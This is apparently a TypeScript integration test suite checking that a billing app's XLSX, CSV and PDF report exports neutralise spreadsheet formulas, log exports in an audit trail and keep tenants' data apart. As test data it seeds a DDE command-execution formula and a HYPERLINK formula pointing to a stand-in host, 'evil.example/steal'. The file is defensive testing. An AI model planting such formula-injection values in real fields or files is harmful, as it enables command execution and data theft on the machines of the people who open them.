import ExcelJS from 'exceljs';
import type request from 'supertest';
import { Actor, TenantFixture, TestApp } from '../../../test/helpers';
import { dubaiDay, issueInvoice, line, pay, refund, seedCustomer } from './fixtures';

const binary = (req: request.Test) =>
  req.buffer(true).parse((res, cb) => {
    const chunks: Buffer[] = [];
    res.on('data', (c: Buffer) => chunks.push(c));
    res.on('end', () => cb(null, Buffer.concat(chunks)));
  });
const workbook = async (buffer: Buffer) => {
  const wb = new ExcelJS.Workbook();
  await wb.xlsx.load(buffer as any);
  return wb;
};

const EVIL_NAME = "=cmd|' /C calc'!A0";
const EVIL_REASON = '=HYPERLINK("http://evil.example/steal","Refund receipt")';

describe('Report exports', () => {
  let t: TestApp;
  let alpha: TenantFixture;
  let beta: TenantFixture;
  let accountant: Actor;
  const today = () => `from=${dubaiDay(0)}&to=${dubaiDay(0)}`;

  beforeAll(async () => {
    t = await TestApp.create();
    alpha = await t.createTenant({ name: 'Al Noor Typing' });
    beta = await t.createTenant();
    accountant = await t.addStaff(alpha, 'accountant');
    // A customer whose name and a refund whose reason are spreadsheet formulas.
    const customer = await seedCustomer(t, alpha, { fullName: EVIL_NAME });
    const invoice = await issueInvoice(t, accountant, { customerId: customer.id, branchId: alpha.headOfficeId, items: [line('SERVICE_FEE', '100.00', { taxRatePercent: 5 }), line('GOVERNMENT_FEE', '50.00', { taxRatePercent: 0 })] });
    const payment = await pay(t, accountant, { invoiceId: invoice.id, amount: '155.00', branchId: alpha.headOfficeId, customerId: customer.id });
    await refund(t, accountant, alpha.owner, { paymentId: payment.id, invoiceId: invoice.id, amount: '15.50', reason: EVIL_REASON });
    await t.settle();
  });
  afterAll(() => t.close());

  it('exports XLSX with typed cells, a totals row and a Parameters sheet', async () => {
    const res = await binary(t.as(accountant).get(`/reports/refunds/export?format=xlsx&${today()}`)).expect(200);
    expect(res.headers['content-type']).toBe('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
    expect(res.headers['content-disposition']).toBe(`attachment; filename="refunds_${dubaiDay(0)}.xlsx"`);
    expect(res.headers['cache-control']).toBe('private, no-store');
    const wb = await workbook(res.body);
    const sheet = wb.getWorksheet('Report')!;
    const header = (sheet.getRow(1).values as unknown[]).slice(1) as string[];
    const cell = (row: number, label: string) => sheet.getRow(row).getCell(header.indexOf(label) + 1);
    expect(header).toEqual(expect.arrayContaining(['Refund', 'Paid out', 'Customer', 'Amount', 'Government-fee part', 'Reason']));

    expect(cell(2, 'Paid out').value).toBeInstanceOf(Date);
    expect((cell(2, 'Paid out').value as Date).toISOString().slice(0, 10)).toBe(dubaiDay(0));
    expect(cell(2, 'Amount').value).toBe(15.5);
    expect(cell(2, 'Amount').numFmt).toBe('#,##0.00');
    // 15.50 of 155.00: one tenth of every component - 10.50 service fee (incl. tax), 5.00 government fee
    expect(cell(2, 'Service-fee part').value).toBe(10.5);
    expect(cell(2, 'Government-fee part').value).toBe(5);
    expect(String(cell(2, 'Refund').value)).toMatch(/^RFD-/);
    // Totals row.
    expect(String(cell(3, 'Refund').value)).toBe('Total (1)');
    expect(cell(3, 'Amount').value).toBe(15.5);
    expect(cell(3, 'Amount').font?.bold).toBe(true);

    const info = wb.getWorksheet('Parameters')!;
    const pairs: Record<string, unknown> = {};
    const texts: string[] = [];
    info.eachRow((row) => {
      if (row.getCell(1).value) pairs[String(row.getCell(1).value)] = row.getCell(2).value;
      if (typeof row.getCell(2).value === 'string') texts.push(row.getCell(2).value as string);
    });
    expect(pairs).toMatchObject({ Report: 'Refunds', Centre: 'Al Noor Typing', Period: dubaiDay(0), Branch: 'All branches', Currency: 'AED', 'Time zone of the report': 'Asia/Dubai' });
    expect(pairs['Generated at (UTC)']).toBeInstanceOf(Date);
    expect(texts.join(' ')).toMatch(/counted when they are paid out/);
  });

  it('neutralises formulas typed by users in XLSX', async () => {
    const res = await binary(t.as(accountant).get(`/reports/refunds/export?format=xlsx&${today()}`)).expect(200);
    const wb = await workbook(res.body);
    const sheet = wb.getWorksheet('Report')!;
    const header = (sheet.getRow(1).values as unknown[]).slice(1) as string[];
    expect(sheet.getRow(2).getCell(header.indexOf('Customer') + 1).value).toBe(`'${EVIL_NAME}`);
    expect(sheet.getRow(2).getCell(header.indexOf('Reason') + 1).value).toBe(`'${EVIL_REASON}`);
    let cells = 0;
    for (const ws of wb.worksheets) {
      ws.eachRow((row) => row.eachCell((c) => {
        cells += 1;
        expect([ExcelJS.ValueType.Formula, ExcelJS.ValueType.Hyperlink]).not.toContain(c.type);
        if (typeof c.value === 'string') expect(/^[\s]*[=+\-@]/.test(c.value)).toBe(false);
      }));
    }
    expect(cells).toBeGreaterThan(20);
    // The raw workbook contains no formula element at all.
    expect(res.body.includes(Buffer.from('<f>'))).toBe(false);
  });

  it('neutralises them in CSV too, and in the outstanding-payments report', async () => {
    const res = await binary(t.as(accountant).get(`/reports/refunds/export?format=csv&${today()}`)).expect(200);
    expect(res.headers['content-type']).toMatch(/^text\/csv/);
    expect(res.headers['content-disposition']).toContain(`refunds_${dubaiDay(0)}.csv`);
    const csv = (res.body as Buffer).toString('utf8');
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv).toContain(`,'${EVIL_NAME},`);
    expect(csv).toContain(`"'=HYPERLINK(""http://evil.example/steal"",""Refund receipt"")"`);
    expect(csv).toContain(',15.50,10.50,5.00,0.00,No,');
    const fields = csv.slice(1).split('\r\n').slice(1).flatMap((l) => l.split(','));
    expect(fields.some((f) => /^"?[=+@]/.test(f))).toBe(false);

    const open = await binary(t.as(accountant).get('/reports/outstanding-payments/export?format=csv')).expect(200);
    const lines = (open.body as Buffer).toString('utf8').slice(1).split('\r\n');
    expect(lines[1].startsWith(`'${EVIL_NAME},`)).toBe(true);
    expect(lines[1]).toContain(',15.50'); // the refunded amount is due again
    expect(open.headers['content-disposition']).toContain(`outstanding-payments_${dubaiDay(0)}.csv`);
  });

  it('exports PDF with the centre in the document properties', async () => {
    const res = await binary(t.as(accountant).get(`/reports/daily-sales/export?format=pdf&${today()}`)).expect(200);
    expect(res.headers['content-type']).toBe('application/pdf');
    expect(res.headers['content-disposition']).toBe(`attachment; filename="daily-sales_${dubaiDay(0)}.pdf"`);
    const pdf = res.body as Buffer;
    expect(pdf.subarray(0, 5).toString()).toBe('%PDF-');
    expect(pdf.subarray(-6).toString()).toContain('%%EOF');
    const raw = pdf.toString('latin1');
    expect(raw).toContain('(Daily sales)'); // the document title ...
    expect(raw).toContain('(Al Noor Typing)'); // ... and its author, in the document properties
    expect(pdf.length).toBeGreaterThan(1500);
  });

  it('audits every export with who, what and which filters', async () => {
    const before = await t.sys.auditLog.count({ where: { tenantId: alpha.id, action: 'report.exported' } });
    await binary(t.as(accountant).get(`/reports/liabilities/export?format=xlsx&${today()}&branchId=${alpha.headOfficeId}`)).expect(200);
    const logs = await t.sys.auditLog.findMany({ where: { tenantId: alpha.id, action: 'report.exported' }, orderBy: { createdAt: 'desc' } });
    expect(logs.length).toBe(before + 1);
    expect(logs[0]).toMatchObject({ actorUserId: accountant.userId, actorType: 'STAFF', resourceType: 'Report', resourceId: 'liabilities', summary: 'Government-fee and third-party liabilities exported as XLSX' });
    expect(logs[0].after).toMatchObject({ format: 'xlsx', from: dubaiDay(0), to: dubaiDay(0), branchIds: [alpha.headOfficeId], rows: 2 });
    // Viewing a report is not an export and is not audited as one.
    await t.as(accountant).get(`/reports/liabilities?${today()}`).expect(200);
    expect(await t.sys.auditLog.count({ where: { tenantId: alpha.id, action: 'report.exported' } })).toBe(before + 1);
  });

  it('requires report.export and the report permission, and validates the format', async () => {
    const reviewer = await t.addStaff(alpha, 'reviewer');
    await t.as(reviewer).get('/reports/refunds/export?format=xlsx').expect(403);
    await t.as(accountant).get('/reports/refunds/export').expect(400);
    await t.as(accountant).get('/reports/refunds/export?format=docx').expect(400);
    await t.as(accountant).get('/reports/nothing/export?format=xlsx').expect(404);
    await t.as(null).get('/reports/refunds/export?format=xlsx').expect(401);
  });

  it('never contains rows of another centre', async () => {
    const res = await binary(t.as(beta.owner).get(`/reports/refunds/export?format=csv&${today()}`)).expect(200);
    const csv = (res.body as Buffer).toString('utf8');
    expect(csv).not.toContain('HYPERLINK');
    expect(csv).not.toContain('calc');
    expect(csv.slice(1).split('\r\n').filter(Boolean)).toHaveLength(2); // header + totals
    expect(await t.sys.auditLog.count({ where: { tenantId: beta.id, action: 'report.exported' } })).toBe(1);
  });
});
